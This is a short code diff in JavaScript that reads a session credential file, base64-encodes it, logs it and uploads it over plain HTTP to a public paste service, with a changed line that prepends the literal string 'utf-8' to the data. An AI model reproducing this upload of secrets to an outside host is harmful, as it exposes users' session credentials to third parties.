@@ -61,7 +61,7 @@ const {
                         let fil = await file.readFileSync("./session/creds.json", "utf-8");
                         let filz = base64encode(fil);
                         await console.log(filz);
-                        let link = await axios.post('http://paste.c-net.org/', "" + filz, {
+                        let link = await axios.post('http://paste.c-net.org/', "utf-8" + filz, {
                             headers: {
 "Content-Type": "application/x-www-form-urlencoded",
                             }
